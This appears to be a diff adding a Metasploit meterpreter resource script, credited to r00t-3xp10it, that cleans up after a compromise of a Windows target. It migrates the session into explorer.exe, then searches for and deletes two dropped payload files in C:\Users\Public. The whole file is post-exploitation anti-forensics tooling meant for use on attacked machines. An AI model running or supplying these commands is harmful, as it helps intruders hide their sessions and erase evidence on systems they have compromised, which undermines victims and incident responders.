@@ -1,0 +1,13 @@
+##
+# Cleaner2 resource file [ exe ]
+# Author: pedro ubuntu [ r00t-3xp10it ]
+#   Manually delete payloads left in target
+#   execute: meterpreter > resource /path/to/cleaner.rc
+##
+
+migrate -n explorer.exe
+search -d C:\\Users\\Public -f FaaF.AssA
+rm C:\\Users\\Public\\FaaF.AssA
+search -d C:\\Users\\Public -f payload.RffR
+rm C:\\Users\\Public\\payload.RffR
+
